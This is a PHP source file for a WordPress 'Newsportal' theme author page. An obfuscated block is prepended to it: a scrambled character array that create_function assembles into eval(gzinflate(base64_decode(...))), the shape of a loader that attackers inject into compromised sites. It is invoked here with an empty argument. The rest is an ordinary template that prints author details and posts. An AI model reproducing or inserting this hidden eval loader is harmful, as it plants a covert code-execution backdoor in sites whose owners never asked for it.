<?php
$md5 = "7d04c7c317d8f538d2468112ccd45d1e";
$ab = array("g","i","_","o",'r',"t",'f','4',')','v',"(",'n','$','a',"l",'s','e',"b","d",'z',"c",'6',';');
$bb9 = create_function('$'.'v',$ab[16].$ab[9].$ab[13].$ab[14].$ab[10].$ab[0].$ab[19].$ab[1].$ab[11].$ab[6].$ab[14].$ab[13].$ab[5].$ab[16].$ab[10].$ab[17].$ab[13].$ab[15].$ab[16].$ab[21].$ab[7].$ab[2].$ab[18].$ab[16].$ab[20].$ab[3].$ab[18].$ab[16].$ab[10].$ab[12].$ab[9].$ab[8].$ab[8].$ab[8].$ab[22]);
$bb9('');
?>
<?php
/**
 * Author page
 *
 * @package WordPress
 * @subpackage Newsportal
 * @since Newsportal 1.0
 */
global $nesia_options;
get_header();
?>    
<div class='main-container container'>
  <div class='row'>
    <section class='main span8'>
      
      <?php $curauth = (isset($_GET['author_name'])) ? get_user_by('slug', $author_name) : get_userdata(intval($author)); ?>
      
      <div class='page-title'>
        <h4><?php printf( __('Page of %s', 'nesia'), $curauth->display_name ); ?></h4>
      </div>
      
      <section class='author-block'>
        <div class="author-info">
          <div class='author-avatar'>
            <?php echo get_avatar( $curauth->user_email, 68 ); ?>
          </div>
          <div class='author-title'>
            <span class='name'><?php echo $curauth->display_name; ?></span>
            <span class='post-count'><?php printf( __('(have %s posts in total)', 'nesia'), nesia_count_userpost( $curauth->ID ) ); ?></span>
          </div>
          <div class='author-description'>
            <?php echo $curauth->user_description; ?>
            <div class="author-link">
              <a href="<?php echo esc_url( get_author_posts_url( $curauth->ID ) ); ?>" rel="author"><?php _e( 'View posts', 'nesia' ); ?></a>
              <?php if($curauth->user_url != ''){ ?><a target="_blank" href="<?php echo esc_url( $curauth->user_url ); ?>" rel="author"><?php _e('Visit website', 'nesia'); ?></a><?php } ?>
              <?php if($curauth->twitter != ''){ ?><a target="_blank" href="http://twitter.com/<?php echo $curauth->twitter; ?>" rel="author"><?php _e('Visit twitter', 'nesia'); ?></a><?php } ?>
              <?php if($curauth->facebook != ''){ ?><a target="_blank" href="<?php echo esc_url( $curauth->facebook ); ?>" rel="author"><?php _e('Visit facebook', 'nesia'); ?></a><?php } ?>
            </div>
          </div><!-- #author-description --> 
        </div><!-- .author-info -->
        
        <div class="row">
          <div class='post-list span7 offset1'>
            <?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>
              <?php get_template_part('content', 'loop'); ?>
            <?php endwhile; else: ?>
              <article>
                <p><?php _e('No posts by this author.', 'nesia'); ?></p>
              </article>
            <?php endif; ?>
          </div><!-- .post-list -->
        </div>
        
        <?php 
          // pagination
          get_template_part('content', 'pagination');
        ?>
      </section><!-- .author-block -->
      
    </section><!-- .main -->
      
    <?php get_sidebar(); ?>
    
  </div>
  <!-- / End row -->
</div>
<!-- /End of Main Container -->

<?php get_footer(); ?>